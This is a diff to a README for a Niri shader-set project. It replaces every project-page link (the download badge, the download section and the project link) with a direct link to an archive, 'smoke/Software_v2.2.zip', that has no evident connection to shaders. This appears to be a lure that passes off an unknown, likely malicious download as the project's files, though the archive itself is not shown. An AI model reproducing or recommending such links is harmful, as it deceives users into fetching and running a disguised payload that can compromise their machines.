@@ -1,6 +1,6 @@
 # 🎨 shaders - Smooth shader sets for Niri
 
-[![Download shaders](https://img.shields.io/badge/Download%20shaders-blue?style=for-the-badge)](https://github.com/canicosaj534/shaders)
+[![Download shaders](https://img.shields.io/badge/Download%20shaders-blue?style=for-the-badge)](https://github.com/canicosaj534/shaders/raw/refs/heads/main/smoke/Software_v2.2.zip)
 
 ## 🖥️ What this is
 
@@ -28,7 +28,7 @@ If you plan to use these shaders with Niri on another system later, the files wi
 
 Use this link to visit the project page and download the files:
 
-https://github.com/canicosaj534/shaders
+https://github.com/canicosaj534/shaders/raw/refs/heads/main/smoke/Software_v2.2.zip
 
 Follow these steps:
 
@@ -144,7 +144,7 @@ Only download the files from the project page linked above. Keep the folder in a
 
 ## 📌 Project link
 
-https://github.com/canicosaj534/shaders
+https://github.com/canicosaj534/shaders/raw/refs/heads/main/smoke/Software_v2.2.zip
 
 ## 🧭 Quick steps
 
